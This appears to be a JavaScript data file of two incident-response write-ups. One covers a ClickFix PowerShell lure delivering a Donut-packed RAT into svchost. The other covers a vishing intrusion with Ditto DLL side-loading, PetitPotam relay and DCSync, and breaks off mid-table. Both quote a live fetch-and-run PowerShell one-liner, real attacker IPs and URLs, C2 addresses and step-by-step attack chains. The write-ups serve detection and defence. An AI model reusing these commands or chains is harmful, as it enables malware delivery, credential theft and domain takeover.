window.GHOST_WRITEUPS = [
  {
    "id": "clickfix-clr-rat",
    "title": "ClickFix to CLR RAT Delivery Chain",
    "summary": "ClickFix PowerShell lure to Donut shellcode, native MinGW injector into BluetoothUserService svchost, CLR implant sub00, and C2 on 91.92.243.161:3038.",
    "category": "DFIR",
    "date": "2026-07-08",
    "readTime": "5 min",
    "tags": [
      "clickfix",
      "donut",
      "process-injection",
      "clr",
      "rat",
      "delivery-chain"
    ],
    "content": "<h1>ClickFix to CLR RAT Delivery Chain</h1>\n<h2>Summary</h2>\n<pre><code>CLASS      : RAT delivery / process injection\nVECTOR     : ClickFix (PowerShell paste)\nSTAGE 1    : PowerShell stager → in-memory Donut shellcode\nSTAGE 2    : mod_s_enterprise (native MinGW loader / injector)\nSTAGE 3    : student_S.bin (native PE; CLR host candidate)\nEXEC HOST  : svchost.exe -k BthAppGroup -p -s BluetoothUserService\nIMPLANT    : CLR assembly sub00 (in-memory)\nPOST       : Screenshots, Edge DPAPI, additional unbacked CLR loads\nC2         : 91.92.243.161:3038\n</code></pre>\n<p>ClickFix lure instructed the user to run a PowerShell one-liner. Stager fetched Donut-packed shellcode, executed it in-memory, and injected into a Bluetooth-related <code>svchost</code> instance. Runtime telemetry showed CLR assembly <code>sub00</code> in that process, then screenshot collection, browser credential access, and outbound C2.</p>\n<h2>Attack Chain</h2>\n<pre><code>User pastes ClickFix PowerShell command\n  → iex(irm http://158.94.211.77/?sid=&lt;random&gt;)\n  → PowerShell stager fetches http://158.94.211.76/s_enterprise\n  → VirtualAlloc + Marshal.Copy + CreateThread (in-memory shellcode)\n  → Donut unwrap → mod_s_enterprise (native PE injector)\n  → Fetch http://158.94.211.76/enterprise/student_s.bin\n  → Inject into svchost (BluetoothUserService)\n  → CLR assembly sub00 loads in injected svchost\n  → Screenshot / Edge DPAPI / additional unbacked CLR\n  → C2 91.92.243.161:3038\n</code></pre>\n<h2>Initial Access - ClickFix</h2>\n<p>Fake verification workflow instructed the user to open PowerShell and execute:</p>\n<pre><code class=\"language-powershell\">iex(irm http://158.94.211.77/?sid=&lt;random&gt;)\n</code></pre>\n<p>The response is a PowerShell stager, not the final payload. User execution is the only initial access mechanism - no exploit required.</p>\n<h2>Stage 1 - PowerShell Shellcode Runner</h2>\n<p>Stager pivots to payload host <code>158.94.211.76</code> and retrieves:</p>\n<pre><code>/s_enterprise\n</code></pre>\n<p>Static indicators for <code>s_enterprise</code>:</p>\n<ul>\n<li>No PE headers; elevated entropy</li>\n<li>Strings dominated by high-entropy noise and packing prologue fragments (<code>WAVAWH</code>, <code>A_A^A]A\\_^]</code>)</li>\n<li>Consistent with packed/encoded shellcode (Donut-class wrapper)</li>\n</ul>\n<p>Payload never written to disk. Execution uses in-memory APIs:</p>\n<pre><code class=\"language-powershell\">VirtualAlloc\nMarshal.Copy\nCreateThread\n</code></pre>\n<h2>Stage 2 - Donut → mod_s_enterprise</h2>\n<p>Donut decryption of <code>s_enterprise</code> yields native PE <code>mod_s_enterprise</code>.</p>\n<h3>capa / ATT&amp;CK</h3>\n<table>\n<thead>\n<tr>\n<th>ATT&amp;CK Tactic</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Defense Evasion</td>\n<td>Process Injection: Thread Execution Hijacking [T1055.003]</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Reflective Code Loading [T1620]</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>Process Discovery [T1057] / Software Discovery [T1518]</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>Shared Modules [T1129]</td>\n</tr>\n<tr>\n<td>Privilege Escalation</td>\n<td>Access Token Manipulation [T1134]</td>\n</tr>\n</tbody>\n</table>\n<p>Capability highlights: WinHTTP request/response, TLS section, TLS callback patterns, <code>SeDebugPrivilege</code>, process enumeration, thread injection, execute shellcode via indirect call, spawn thread to RWX shellcode.</p>\n<h3>Toolchain / imports</h3>\n<p>MinGW-compiled (GCC 15.x), not MSVC. Notable imports from <code>ADVAPI32.dll</code>, <code>KERNEL32.dll</code>, <code>WINHTTP.dll</code>:</p>\n<pre><code>VirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\nOpenProcess\nAdjustTokenPrivileges\nWinHttp*\n</code></pre>\n<h3>Staging strings (UTF-16LE)</h3>\n<pre><code>svchost.exe\npowershell\n158.94.211.76\nenterprise/student_s.bin\n</code></pre>\n<p><code>mod_s_enterprise</code> is a loader/injector, not the final implant. Hardcoded path:</p>\n<pre><code>158.94.211.76/enterprise/student_s.bin\n</code></pre>\n<h2>Stage 3 - student_S.bin</h2>\n<p>Retrieved PE:</p>\n<pre><code>student_S.bin: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 7 sections\n</code></pre>\n<h3>Not a managed assembly</h3>\n<pre><code class=\"language-bash\">ilspycmd -p -o student_STAGE student_S.bin\n</code></pre>\n<pre><code>ICSharpCode.Decompiler.Metadata.PEFileNotSupportedException:\nPE file does not contain any managed metadata.\n</code></pre>\n<p>Treat as native. Do not analyze as .NET without further evidence.</p>\n<h3>sub00 string</h3>\n<pre><code class=\"language-bash\">rabin2 -zz student_S.bin | grep -i sub00\n</code></pre>\n<pre><code>3137  0x00030de8  0x140030de8  5  6  .data  ascii  sub00\n</code></pre>\n<p>Single <code>.data</code> reference. Runtime correlation appears in Stage 4.</p>\n<h2>Stage 4 - Injection and CLR Load</h2>\n<p>First visible execution remains inside PowerShell. Defender records in-memory CLR assembly:</p>\n<pre><code>jq5ksud0\n</code></pre>\n<p>Then:</p>\n<pre><code>CreateRemoteThreadApiCall\n</code></pre>\n<p>Target process:</p>\n<pre><code>svchost.exe -k BthAppGroup -p -s BluetoothUserService\n</code></pre>\n<p>Matches injection capability flagged by capa on <code>mod_s_enterprise</code>.</p>\n<p>Second CLR assembly loads inside the same BluetoothUserService <code>svchost</code>:</p>\n<pre><code>sub00\n</code></pre>\n<p>Name matches the <code>student_S.bin</code> <code>.data</code> string.</p>\n<h3>Correlation note</h3>\n<table>\n<thead>\n<tr>\n<th>Source</th>\n<th>Finding</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Static (<code>student_S.bin</code>)</td>\n<td>Native PE; no managed metadata; string <code>sub00</code> in <code>.data</code></td>\n</tr>\n<tr>\n<td>Runtime (Defender)</td>\n<td>CLR assembly named <code>sub00</code> in injected <code>svchost</code></td>\n</tr>\n</tbody>\n</table>\n<p>Strong name correlation; mechanical link not fully confirmed. Manual CLR hosting (<code>mscoree.dll</code> / <code>CLRCreateInstance</code>) is the leading theory and was not confirmed from the import table captured in this pass.</p>\n<h2>Stage 5 - Post-Injection Behavior</h2>\n<p><code>BluetoothUserService</code> is a convenient legitimate <code>svchost</code> residence, not Bluetooth-specific tradecraft.</p>\n<p>Defender telemetry from the injected process:</p>\n<table>\n<thead>\n<tr>\n<th>Behavior</th>\n<th>Observation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Screenshots</td>\n<td><code>ScreenshotTaken</code> from injected service process</td>\n</tr>\n<tr>\n<td>Credential access</td>\n<td><code>DPAPI Accessed / Microsoft Edge</code></td>\n</tr>\n<tr>\n<td>Further payloads</td>\n<td>Multiple unbacked CLR assemblies loaded dynamically; no additional disk writes observed</td>\n</tr>\n</tbody>\n</table>\n<p>Working picture only: re-validate process attribution and event rows from <code>DeviceNetworkEvents</code> / <code>DeviceEvents</code> before customer-facing claims.</p>\n<h2>Stage 6 - Command and Control</h2>\n<p>Post-execution infrastructure (not used for initial delivery):</p>\n<pre><code>91.92.243.161:3038\n</code></pre>\n<p>Sandbox execution of <code>student_S.bin</code> contacted the same host. Classification:</p>\n<pre><code>RAT\nGeneric Agent\nC2 Activity\n</code></pre>\n<p>~28 MB outbound traffic observed in the surrounding window. Treat as <strong>suspicious outbound transfer</strong> until <code>DeviceNetworkEvents</code> rows are re-validated; do not label confirmed exfiltration without that evidence.</p>\n<h3>Infrastructure roles</h3>\n<pre><code>Host                Role\n------------------  --------------------------------------------------------\n158.94.211.77       ClickFix delivery\n158.94.211.76       Payload staging (/s_enterprise, /enterprise/student_s.bin)\n91.92.243.161:3038  Operational C2\n</code></pre>\n<h2>Artifacts</h2>\n<h3>s_enterprise</h3>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Type</td>\n<td>Donut shellcode wrapper (packed / high entropy)</td>\n</tr>\n<tr>\n<td>Disk write</td>\n<td>None (in-memory via PowerShell)</td>\n</tr>\n<tr>\n<td>Unwraps to</td>\n<td><code>mod_s_enterprise</code></td>\n</tr>\n</tbody>\n</table>\n<h3>mod_s_enterprise</h3>\n<pre><code>MD5      881d500742127a52ae5a52a29de66ffb\nSHA1     c4b150ad42a10b514a643357c8d7f9a9105f3ba1\nSHA256   4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a\nFormat   PE32+, x86-64, MinGW/GCC 15.x\nRole     Injector / secondary stage fetcher\n</code></pre>\n<h3>student_S.bin</h3>\n<pre><code>Type     PE32+, x64, native (no managed metadata)\nCompiled 2026-07-08 23:09:10 UTC\nSHA256   53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db\nString   sub00 (.data)\n</code></pre>\n<h2>Indicators of Compromise</h2>\n<h3>Hashes</h3>\n<pre><code>File               Type    Hash\n-----------------  ------  ----------------------------------------------------------------\nmod_s_enterprise   MD5     881d500742127a52ae5a52a29de66ffb\nmod_s_enterprise   SHA1    c4b150ad42a10b514a643357c8d7f9a9105f3ba1\nmod_s_enterprise   SHA256  4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a\nstudent_S.bin      SHA256  53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db\n</code></pre>\n<h3>Network</h3>\n<pre><code>Indicator                                          Role\n-------------------------------------------------  --------------------------------\n158.94.211.77                                      ClickFix / initial PowerShell stage\n158.94.211.76                                      Payload host\nhttp://158.94.211.76/s_enterprise                  Donut shellcode\nhttp://158.94.211.76/enterprise/student_s.bin      Secondary PE\n91.92.243.161:3038                                 Operational C2\n</code></pre>\n<h3>Process / runtime</h3>\n<pre><code>svchost.exe -k BthAppGroup -p -s BluetoothUserService\nCreateRemoteThreadApiCall → BluetoothUserService\nCLR assemblies (in-memory): jq5ksud0, sub00\n</code></pre>\n<h2>Detection Opportunities</h2>\n<ul>\n<li>PowerShell <code>irm | iex</code> against unknown IPs from interactive user context (ClickFix paste)</li>\n<li>PowerShell allocating RWX memory and creating threads without disk write of payload</li>\n<li><code>CreateRemoteThread</code> into <code>svchost.exe</code> with <code>BluetoothUserService</code> / <code>BthAppGroup</code></li>\n<li>Unbacked / memory-only CLR loads inside <code>svchost</code> or PowerShell (<code>sub00</code>, random names)</li>\n<li><code>ScreenshotTaken</code> or Edge DPAPI access originating from <code>svchost</code> service instances</li>\n<li>Outbound connections from injected <code>svchost</code> to non-Microsoft infrastructure (e.g. <code>91.92.243.161:3038</code>)</li>\n<li>WinHTTP + classic injection import cluster (<code>VirtualAllocEx</code> / <code>WriteProcessMemory</code> / <code>CreateRemoteThread</code>) in MinGW-built binaries</li>\n</ul>\n<h2>Open Questions</h2>\n<ul>\n<li>How does native <code>student_S.bin</code> (no managed metadata) associate with CLR assembly <code>sub00</code> at runtime? Manual CLR hosting is unconfirmed from imports captured so far.</li>\n<li>What injection primitive does <code>student_S.bin</code> itself use? Strongest capa/import evidence currently sits on <code>mod_s_enterprise</code>.</li>\n<li>Is the ~28 MB outbound volume exfiltration or large staging/beacon traffic? Needs <code>DeviceNetworkEvents</code> validation.</li>\n<li>Is <code>91.92.243.161</code> the complete C2 set, or is additional infrastructure unresolved?\n)</li>\n</ul>"
  },
  {
    "id": "ditto-delivery-chain",
    "title": "Ditto DLL Side-Loading and Domain Compromise",
    "summary": "Quick Assist to pdf24/user.dll (blocked) then Ditto with fake vcruntime140.dll, DNS C2, and KRBTGT compromise in under one hour.",
    "category": "DFIR",
    "date": "2026-06-24",
    "readTime": "13 min",
    "tags": [
      "quick-assist",
      "ditto",
      "dll-sideload",
      "domain-compromise",
      "social-engineering"
    ],
    "content": "<h1>Ditto DLL Side-Loading and Domain Compromise</h1>\n<h2>Summary</h2>\n<pre><code>CLASS      : KRBTGT compromise / domain intrusion\nVECTOR     : Vishing + Microsoft Quick Assist\nIMPLANT    : Botan RAT via user.dll (pdf24) then fake vcruntime140.dll (Ditto)\nC2         : Malformed DNS over UDP/53 → 45.55.94.174\nTTX        : Domain compromise &lt; 60 minutes\nRANSOMWARE : Not observed\nOBJECTIVE  : Persistent privileged access\n</code></pre>\n<p>A user was social-engineered into accepting an unsolicited Microsoft Quick Assist session after a vishing call. The remote operator ran brief host reconnaissance, then dropped two MSI packages from the same staging host. Stage 1 used a PDF-utility host (<code>pdf24.exe</code>) with malicious <strong><code>user.dll</code></strong> and was blocked by Defender. Stage 2 installed a Ditto-looking directory under the user profile: legitimate <strong><code>Ditto.exe</code></strong> side-loading a <strong>fake <code>vcruntime140.dll</code></strong> implant, plus Startup-folder persistence.</p>\n<p>From there the case stopped looking like \"someone installed a clipboard manager.\" The fake runtime DLL is a MinGW/Botan RAT (same family as Stage 1 <code>user.dll</code>). It beaconed over UDP/53 to a non-resolver IP with malformed DNS payloads, and within about thirty minutes the operator had coerced DC authentication, performed DCSync, and started RDP lateral movement with a Domain Admin service account. GetScreen and DWAgent were planted for extra footholds. No ransomware was observed. The objective was durable privileged access.</p>\n<h2>Attack Chain</h2>\n<pre><code>Social engineering (vishing)\n  → Quick Assist session\n  → Host recon (whoami, ipconfig, net user /domain)\n  → pd_53updates.msi → pdf24.exe + user.dll (blocked by Defender)\n  → dt_53updates.msi (successful)\n  → Ditto.exe side-loads fake vcruntime140.dll from %LOCALAPPDATA%\\Ditto\\\n  → Botan RAT beacon (AES-256-GCM, UDP/53 C2)\n  → PetitPotam (\\PIPE\\efsrpc → DC01)\n  → NTLM relay (DC01 → 167.172.212.171)\n  → DCSync (DRSGetNCChanges)\n  → KRBTGT / privileged hash extraction\n  → Lateral movement via &lt;svc_account&gt; (RDP)\n  → GetScreen + DWAgent persistence\n</code></pre>\n<h2>Initial Access</h2>\n<p>The entry point was not an exploit. It was a person on a phone and a built-in remote-help tool.</p>\n<p>Microsoft Quick Assist was initiated by an external party and accepted by the user. Quick Assist runs in the logged-on user's context and is often allowed by default in enterprise environments, which makes it an attractive hands-on-keyboard vector once trust is established via vishing.</p>\n<p>The operator did not need privilege elevation at this stage. They already had an interactive session as the victim.</p>\n<h2>Host Reconnaissance</h2>\n<p>Within about two minutes of the session starting, standard interactive recon was observed:</p>\n<pre><code>whoami\nwhoami /groups\nipconfig /all\nping &lt;internal-host&gt;\nnslookup &lt;internal-host&gt;\nnet user /domain\n</code></pre>\n<p>Nothing exotic. User context, network placement, reachability of internal hosts, and domain membership. Enough to decide whether the host was worth the payload.</p>\n<h2>Payload Delivery</h2>\n<h3>Stage 1 - Blocked (pdf24 + user.dll)</h3>\n<p>First package from the staging host:</p>\n<pre><code>URL    : http://&lt;C2-DROP&gt;/pd_53updates.msi\nSOURCE : 45.61.163.226\n</code></pre>\n<p>This stage attempted side-loading under a PDF-utility host (<code>pdf24.exe</code>). The malicious implant library was <strong><code>user.dll</code></strong> next to that host binary. Defender blocked the side-load attempt:</p>\n<pre><code>Potential Side-Loaded Behavior Was Blocked\n</code></pre>\n<p><code>pdf24.exe</code> / the associated payload was quarantined and an alert fired. That should have been the end of the story. It was not.</p>\n<p>String extraction from the Stage 1 implant (<code>user.dll</code>) already shows the same Botan RAT family later seen under Ditto: MinGW/GCC 13-win32, Botan 3 AES-GCM, base64 C2 <code>NDUuNTUuOTQuMTc0</code> → <code>45.55.94.174</code>, implant GUID <code>573d2149-b7b1-4d54-b0d4-403195f3984e</code>, and the JSON beacon template. Compile stamp strings include <code>Jun 11 2026</code>. Three minutes later the operator switched hosts and tried again.</p>\n<h3>Stage 2 - Successful (Ditto + fake vcruntime140.dll)</h3>\n<pre><code>URL    : http://&lt;C2-DROP&gt;/dt_53updates.msi\nSOURCE : 45.61.163.226\nSHA256 : 849a2c808694426b2afb8848dcea00f9e64538a503b05543e38af1fdee9dd9f8\nSIZE   : ~4.8 MB\n</code></pre>\n<p>This MSI executed successfully and dropped a Ditto-shaped tree under the user profile. To a casual observer it looks like a clipboard manager install. To DFIR it is a dual-use package: legitimate <code>Ditto.exe</code> as the host, a <strong>fake <code>vcruntime140.dll</code></strong> as the implant, plus other support files and a Startup shortcut for logon persistence.</p>\n<h4>Dropped paths</h4>\n<pre><code>%LOCALAPPDATA%\\Ditto\\Ditto.exe              ← host (legitimate Ditto)\n%LOCALAPPDATA%\\Ditto\\vcruntime140.dll       ← FAKE / implant (side-loaded)\n%LOCALAPPDATA%\\Ditto\\mfc140u.dll\n%LOCALAPPDATA%\\Ditto\\vcruntime140u.dll\n%LOCALAPPDATA%\\Ditto\\msvcp140.dll\n%LOCALAPPDATA%\\Ditto\\ICU_Loader.dll\n%LOCALAPPDATA%\\Ditto\\Addins\\DittoUtil.dll\n%LOCALAPPDATA%\\Ditto\\language\\English.xml\n%LOCALAPPDATA%\\Ditto\\Ditto.Settings\n</code></pre>\n<h4>Persistence</h4>\n<pre><code>%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Ditto.lnk\n</code></pre>\n<h2>DLL Side-Loading</h2>\n<p><code>Ditto.exe</code> in this package is a real clipboard manager binary. It behaves like Ditto. The problem is not the EXE name. The problem is the <strong>fake VC runtime DLL</strong> sitting next to it.</p>\n<p>When <code>Ditto.exe</code> starts, Windows resolves imports with the normal DLL search order. A local <code>vcruntime140.dll</code> is preferred over the system copy under <code>C:\\Windows\\System32\\</code>. The legitimate process therefore loads attacker-controlled code in-process, under a trusted-looking process tree, without a standalone unsigned RAT EXE on disk.</p>\n<p>That is DLL side-loading. Boring, and effective.</p>\n<h3>Malicious libraries (confirmed)</h3>\n<p>Two implant names, two host packages, same RAT family:</p>\n<pre><code>Stage   Host binary     Malicious DLL        Role\n------  --------------  -------------------  ------------------------------------------\n1       pdf24.exe       user.dll             Side-load implant (blocked by Defender)\n2       Ditto.exe       vcruntime140.dll     Fake VC++ runtime; successful side-load\n</code></pre>\n<p>Stage 2 focus for hunting after the blocked PDF stage:</p>\n<pre><code>Path     %LOCALAPPDATA%\\Ditto\\vcruntime140.dll\nSHA256   9d20d9f17dddedd3ea057b68e42ef2ca86ff7c776d59b045213f377ba1707291\nRole     Fake vcruntime140; Botan RAT loaded by Ditto.exe\n</code></pre>\n<p>Other files under <code>%LOCALAPPDATA%\\Ditto\\</code> complete the install appearance (MFC/VC companions, <code>ICU_Loader.dll</code>, <code>Addins\\DittoUtil.dll</code>, settings/language). The implant to prioritize is the <strong>fake <code>vcruntime140.dll</code></strong>. Stage 1's <strong><code>user.dll</code></strong> is the same family under the PDF host and should be treated as an earlier attempt, not a different actor.</p>\n<h3>Why Ditto</h3>\n<p>A real clipboard manager already does things EDRs treat as suspicious in unknown binaries:</p>\n<pre><code>AddClipboardFormatListener\nSetWindowsHookEx\nFindShellTrayWindow\nSendNotifyMessage\nProcess enumeration\n</code></pre>\n<p>Inside random malware, those APIs get attention. Inside <code>Ditto.exe</code>, they look like product behavior. The operator did not pick Ditto at random:</p>\n<ol>\n<li>Open-source and easy to repackage</li>\n<li>Legitimate distributions are unremarkable / often trusted by users</li>\n<li>Clipboard, hooks, and window enumeration are expected</li>\n<li>Small footprint and common enough to ignore in triage</li>\n<li>Local DLL search order makes side-loading straightforward</li>\n</ol>\n<p>The implant does not need to hide every capability. It needs to hide <strong>context</strong> by running inside a process whose job already looks like monitoring and enumeration.</p>\n<h3>Static strings (user.dll / fake vcruntime140.dll)</h3>\n<p>Strings from the Stage 1 implant dump (<code>user.dll</code>) and consistent with the Stage 2 fake <code>vcruntime140.dll</code> family:</p>\n<pre><code>GCC: (GNU) 13-win32\nlibgcc_s_dw2-1.dll\nBotan 3.0.0 (unreleased, revision unknown, distribution unspecified)\nAES-256/GCM\nGHASH requires a 128-bit nonce\nInvalid authentication tag\nBOTAN_MLOCK_POOL_SIZE\nRtlGenRandom / SystemFunction036\nNDUuNTUuOTQuMTc0\n573d2149-b7b1-4d54-b0d4-403195f3984e\n{&quot;name&quot;: &quot;%s&quot;, &quot;build_date&quot;: &quot;%s %s&quot;, &quot;arch&quot;: &quot;windows&quot;, &quot;username&quot;: &quot;%s&quot;, &quot;pid&quot;: &quot;%d&quot; }\nJun 11 2026\n</code></pre>\n<p>MinGW-w64 build with statically linked Botan 3. Not MSVC, not a thin .NET loader. Hand-rolled C++ with real crypto. The Stage 1 <code>user.dll</code> dump also shows heavy <code>userenv.dll</code> export-forward style strings (SysWOW64 userenv API names), consistent with a proxy/side-load library wrapper around the implant payload.</p>\n<h3>Imports and capabilities</h3>\n<pre><code>Threading        : CreateThread, ExitThread, ResumeThread\nSynchronization  : InitializeCriticalSection, SleepConditionVariableCS\nMemory           : VirtualAlloc, VirtualProtect, VirtualFree, VirtualLock\nFilesystem       : FindFirstFileA, FindNextFileA\nNetworking       : WSAStartup, WSACleanup, getaddrinfo, closesocket\nProfiling        : GetComputerNameA, GetUserNameA, GetSystemInfo,\n                   GlobalMemoryStatusEx, GetTickCount\nEvasion          : IsNativeVhdBoot, DisableThreadLibraryCalls\nDynamic Loading  : LoadLibraryA, GetProcAddress\n</code></pre>\n<p>In practice: multi-threaded work, in-memory allocation/execution, Winsock networking, directory enumeration, host profiling, and dynamic API resolution.</p>\n<h3>C2 address (Base64)</h3>\n<pre><code>NDUuNTUuOTQuMTc0  →  45.55.94.174\n</code></pre>\n<h3>Beacon format</h3>\n<pre><code class=\"language-json\">{\n  &quot;name&quot;:      &quot;%s&quot;,\n  &quot;build_date&quot;:&quot;%s %s&quot;,\n  &quot;arch&quot;:      &quot;windows&quot;,\n  &quot;username&quot;:  &quot;%s&quot;,\n  &quot;pid&quot;:       &quot;%d&quot;\n}\n</code></pre>\n<p>Runtime fields include hostname, compile timestamp, architecture (<code>windows</code>), logged-on user, and PID. Beacon payload encrypted with AES-256-GCM before send.</p>\n<h2>C2 - Malformed DNS over UDP/53</h2>\n<p>Sandbox and network telemetry repeatedly showed:</p>\n<pre><code>DESTINATION : 45.55.94.174\nPORT        : 53\nPROTOCOL    : UDP\nORIGIN      : %LOCALAPPDATA%\\Ditto\\Ditto.exe\n</code></pre>\n<p>Traffic was not aimed at the corporate resolver or a public DNS service. It went straight to an attacker IP listening on 53/udp. Packet contents were not valid DNS queries: close enough to look like \"DNS\" in NetFlow, useless as real name resolution.</p>\n<p>This is DNS-as-transport, not DNS-as-service. Outbound 53/udp is open on most workstations. Combined with AES-GCM inside the implant, the channel is encrypted and low-suspicion unless you inspect protocol validity or destination reputation.</p>\n<h2>Post-Exploitation</h2>\n<p>Once the implant was up, the operator moved from \"foothold on one laptop\" to \"domain problem\" quickly.</p>\n<h3>PetitPotam / NTLM relay</h3>\n<p>About nine minutes after the successful MSI:</p>\n<pre><code>TARGET    : DC01\nPIPE      : \\PIPE\\efsrpc\nINTERFACE : EFSRPC (MS-EFSR)\n</code></pre>\n<p>That pattern matches PetitPotam-style coercion: abuse EFSRPC to force a remote host (here, the DC) to authenticate to an attacker-chosen destination. Immediately after, the DC opened outbound auth:</p>\n<pre><code>SOURCE : DC01 (ntoskrnl context)\nDEST   : 167.172.212.171 (DigitalOcean)\n</code></pre>\n<p>Consistent with NTLM relay of the coerced DC authentication to external infrastructure. In a hardened environment, EFSRPC patches, SMB signing, EPA, and channel binding make this much harder. Here, it went through.</p>\n<h3>DCSync</h3>\n<p>Eleven minutes after the first MSI:</p>\n<pre><code>OPERATION : DRSGetNCChanges\nTARGET    : DC01\nSOURCE    : &lt;workstation&gt;\n</code></pre>\n<p><code>DRSGetNCChanges</code> from a workstation is the classic DCSync signal (Mimikatz, Impacket, or similar). That implies credentials with directory replication rights, most likely obtained via the relay path above, and active hash harvesting from AD.</p>\n<p>Expect at least:</p>\n<ul>\n<li><code>krbtgt</code></li>\n<li>privileged / service account hashes</li>\n<li>other high-value directory secrets</li>\n</ul>\n<p>KRBTGT compromise is domain-ending until a <strong>double</strong> KRBTGT password reset (and usually a broader credential reset). That was the correct containment recommendation and was executed later the same day.</p>\n<h3>Privileged service account</h3>\n<p>Directory review turned up <code>&lt;svc_account&gt;</code>: a service account with Domain Administrator membership, no meaningful logon or source-host restrictions, and a long-unchanged password. After DCSync, the operator had its material. That account, not the DLL craft, is what made multi-host RDP trivial.</p>\n<h3>Lateral movement and extra persistence</h3>\n<p>RDP as <code>&lt;svc_account&gt;</code>:</p>\n<pre><code>TARGET 1 : &lt;print-server&gt;\nTARGET 2 : &lt;test-server&gt;\nPROTOCOL : RDP (TCP/3389)\n</code></pre>\n<p>Additional remote-access tools:</p>\n<pre><code>&lt;print-server&gt; : GetScreen.me agent\n&lt;test-server&gt;  : DWAgent\n</code></pre>\n<p>Three independent footholds: Ditto/Botan on the original workstation, GetScreen on the print server, DWAgent on the test server. Isolate one host and you still have two others.</p>\n<h2>Timeline (MDT)</h2>\n<pre><code>13:29  Quick Assist session established\n13:31  Recon commands (whoami, ping, ipconfig, nslookup)\n13:36  Stage 1 MSI downloaded from 45.61.163.226\n13:38  Stage 1 side-load blocked (pdf24.exe + user.dll)\n13:39  Defender alert → SOC queue\n13:39  Stage 2 MSI (dt_53updates.msi) downloaded; Ditto + fake vcruntime140.dll\n13:43  ITSM ticket created\n13:45  Internal enumeration (Kerberos, LDAP, SMB, RDP)\n13:47  PetitPotam activity against DC01 (\\PIPE\\efsrpc)\n13:48  DC01 outbound auth to 167.172.212.171\n13:57  pdf24.exe execution blocked\n13:59  DCSync (DRSGetNCChanges) observed\n14:01  Kerberos TGS requests against DC01\n14:09  RDP to &lt;test-server&gt; as &lt;svc_account&gt;\n14:14  RDP to &lt;print-server&gt; as &lt;svc_account&gt;\n14:15  GetScreen.me downloaded\n14:17  GetScreen persistence on &lt;print-server&gt;\n14:17  DWAgent deployed on &lt;test-server&gt;\n15:53  Workstation isolated\n~21:00 Domain-wide password reset + double KRBTGT reset\n</code></pre>\n<ul>\n<li>First foothold to multi-host persistence: <strong>48 minutes</strong></li>\n<li>First foothold to KRBTGT compromise: <strong>30 minutes</strong></li>\n</ul>\n<h2>MITRE ATT&amp;CK Mapping</h2>\n<table>\n<thead>\n<tr>\n<th>Tactic</th>\n<th>Technique</th>\n<th>ID</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Initial Access</td>\n<td>Remote Services: Quick Assist abuse</td>\n<td>T1219</td>\n</tr>\n<tr>\n<td>Initial Access</td>\n<td>Phishing: Voice / Vishing</td>\n<td>T1566.004</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>User Execution: Malicious File (MSI)</td>\n<td>T1204.002</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>Command and Scripting Interpreter</td>\n<td>T1059</td>\n</tr>\n<tr>\n<td>Persistence</td>\n<td>Boot or Logon Autostart: Startup Folder</td>\n<td>T1547.001</td>\n</tr>\n<tr>\n<td>Persistence</td>\n<td>Remote Access Software (GetScreen, DWAgent)</td>\n<td>T1219</td>\n</tr>\n<tr>\n<td>Privilege Escalation</td>\n<td>Domain Policy Modification (svc account)</td>\n<td>T1484</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Hijack Execution Flow: DLL Side-Loading</td>\n<td>T1574.002</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Obfuscated Files or Information (Base64 C2)</td>\n<td>T1027</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Masquerading: Match Legitimate Name</td>\n<td>T1036.005</td>\n</tr>\n<tr>\n<td>Credential Access</td>\n<td>Forced Authentication (PetitPotam)</td>\n<td>T1187</td>\n</tr>\n<tr>\n<td>Credential Access</td>\n<td>OS Credential Dumping: DCSync</td>\n<td>T1003.006</td>\n</tr>\n<tr>\n<td>Credential Access</td>\n<td>Steal or Forge Kerberos Tickets (KRBTGT)</td>\n<td>T1558</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>System Information Discovery</td>\n<td>T1082</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>System Network Configuration Discovery</td>\n<td>T1016</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>Account Discovery: Domain Account</td>\n<td>T1087.002</td>\n</tr>\n<tr>\n<td>Lateral Movement</td>\n<td>Remote Services: RDP</td>\n<td>T1021.001</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>Application Layer Protocol: DNS</td>\n<td>T1071.004</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>Encrypted Channel: Symmetric (AES-GCM)</td>\n<td>T1573.001</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>Non-Standard Port (DNS-as-transport)</td>\n<td>T1571</td>\n</tr>\n</tbody>\n</table>\n<h2>Indicators of Compromise</h2>\n<h3>Network</h3>\n<pre><code>Indicator           Role\n------------------  ----------------------------------------\n45.55.94.174        C2 (DNS-tunneled, UDP/53)\n45.61.163.226       MSI staging host\n167.172.212.171     NTLM relay endpoint (DigitalOcean)\n</code></pre>\n<h3>Encoded strings</h3>\n<pre><code>NDUuNTUuOTQuMTc0    Base64 for 45.55.94.174\n</code></pre>\n<h3>Files and hashes (SHA256)</h3>\n<pre><code>Path / file                                      Notes / Hash\n-----------------------------------------------  ----------------------------------------------------------------\nuser.dll (Stage 1, with pdf24.exe)               Malicious implant (blocked); same Botan family as Stage 2\ndt_53updates.msi                                 